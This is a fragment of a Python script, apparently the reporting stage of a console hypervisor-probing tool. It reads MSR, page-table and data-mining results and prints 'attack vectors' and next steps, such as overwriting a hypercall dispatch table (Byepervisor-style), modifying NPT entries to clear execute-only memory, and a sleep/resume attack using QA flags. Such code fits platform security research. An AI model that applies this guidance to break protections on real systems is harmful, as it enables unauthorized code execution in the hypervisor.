    print('--- ANALYSIS ---')
    print()

    attack_vectors = []

    # Check MSR results
    msrs = results.get('msrs', {})
    if msrs:
        vm_hsave = msrs.get(0xC0010117, {})
        if vm_hsave.get('readable'):
            print('[!] VM_HSAVE_PA is readable — HV memory location leaked')
            print('    Physical address: %#x' % vm_hsave['value'])
            attack_vectors.append('VM_HSAVE_PA readable — VMCB location known')

        efer = msrs.get(0xC0000080, {})
        if efer.get('readable'):
            val = efer['value']
            if val & (1 << 12):
                print('[*] SVME is enabled (expected)')
            if val >> 16:
                print('[!] EFER has high bits set: %#x — may include xotext control' % (val >> 16))
                attack_vectors.append('EFER high bits may control xotext')

    # Check data mining results
    data = results.get('data_mining', {})
    if data:
        tables = data.get('hypercall_tables', [])
        if tables:
            for t in tables:
                if t['count'] >= 8:
                    print('[!] Large function pointer table at offset %#x (%d entries)' % (
                        t['offset'], t['count']))
                    print('    If this is a hypercall dispatch table, overwriting it')
                    print('    could redirect HV execution (Byepervisor-style)')
                    attack_vectors.append('Potential hypercall table at %#x' % t['offset'])

        qa = data.get('qa_flags', [])
        if qa:
            print('[*] %d QA flag candidates found' % len(qa))
            attack_vectors.append('QA flags for sleep/resume attack')

    # Check page table results
    pt = results.get('page_tables', {})
    if pt:
        gaps = pt.get('gaps', [])
        text_ranges = pt.get('text_phys_ranges', [])
        if gaps:
            print('[*] %d physical address gaps found (potential HV regions)' % len(gaps))
        if text_ranges:
            print('[*] .text physical ranges identified — XOM boundary known')

    # Recommendations
    print()
    print('--- RECOMMENDED NEXT STEPS ---')
    print()

    if not attack_vectors:
        print('1. Run hv_probe.py to find the VMMCALL address and probe mailbox')
        print('2. Trace sceSblServiceMailbox internals for HV interface details')
        print('3. Try sleep/resume attack after manually setting QA flags')
        print('4. Fuzz mailbox commands with varied arguments')
    else:
        print('Attack vectors identified:')
        for i, v in enumerate(attack_vectors):
            print('  %d. %s' % (i+1, v))
        print()
        if any('hypercall table' in v.lower() for v in attack_vectors):
            print('PRIORITY: Verify if the function pointer table is shared with HV.')
            print('If writable from guest AND used by HV, this is a Byepervisor-style')
            print('code execution vector.')
        if any('VM_HSAVE' in v for v in attack_vectors):
            print('PRIORITY: VM_HSAVE_PA leaks the HV save area location.')
            print('The VMCB is typically nearby. If the VMCB physical page is')
            print('DMAP-readable, you can modify NPT entries to clear xotext.')
        if any('QA flags' in v for v in attack_vectors):
            print('TRY: Set QA flags, trigger suspend, resume, check persistence.')
